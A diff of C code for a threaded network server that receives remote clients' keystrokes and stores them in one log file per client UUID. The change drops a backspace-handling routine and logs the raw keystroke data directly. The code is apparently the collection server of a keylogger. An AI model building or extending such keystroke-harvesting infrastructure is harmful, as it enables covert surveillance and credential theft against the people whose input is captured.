@@ -25,37 +25,6 @@ FILE* get_or_create_uuid_log(const char* uuid) {
     return log_file;
 }
 
-/* Truncates the last character from the file (supporting UTF-8 multi-byte chars) */
-void handle_backspace(FILE *log_file) {
-    if (!log_file) return;
-    fflush(log_file);
-    
-    off_t size = ftello(log_file);
-    if (size <= 0) return;
-    
-    off_t pos = size - 1;
-    int fd = fileno(log_file);
-    
-    // Step backwards to find the start of the UTF-8 character
-    while (pos >= 0) {
-        unsigned char c;
-        fseeko(log_file, pos, SEEK_SET);
-        if (fread(&c, 1, 1, log_file) != 1) break;
-        // Break when finding a non-continuation byte (either ASCII or start of UTF-8 multibyte)
-        if ((c & 0xC0) != 0x80) break;
-        pos--;
-    }
-    
-    if (pos < 0) pos = 0;
-    
-    // Truncate the file at the identified position
-    if (ftruncate(fd, pos) != 0) {
-        perror("[-] Failed to truncate file for backspace");
-    }
-    // Seek back to the end of the newly truncated file
-    fseeko(log_file, 0, SEEK_END);
-}
-
 /* Thread function to handle incoming client network connections */
 void *handle_client(void *arg) {
     ExtendedClientData *client_info = (ExtendedClientData *)arg;
@@ -102,7 +71,7 @@ void *handle_client(void *arg) {
     // Free the initialization dynamic allocation tracking data
     free(client_info); 
 
-    // Main reception loop
+    // Main reception loop - writes raw inputs and layout markers directly to the log file
     while (1) {
         memset(buffer, 0, sizeof(buffer));
         
@@ -114,14 +83,9 @@ void *handle_client(void *arg) {
             break;
         }
 
-        // Check if the received data is the specific backspace marker
-        if (strcmp(buffer, "[BACKSPACE]") == 0) {
-            handle_backspace(log_file);
-        } else {
-            // Write received keystrokes to the file
-            fprintf(log_file, "%s", buffer);
-            fflush(log_file); // Flush immediately to ensure data persistence
-        }
+        // Write received keystrokes and control tags straight to the persistent log file
+        fprintf(log_file, "%s", buffer);
+        fflush(log_file); // Flush immediately to ensure data persistence
     }
 
     fclose(log_file);
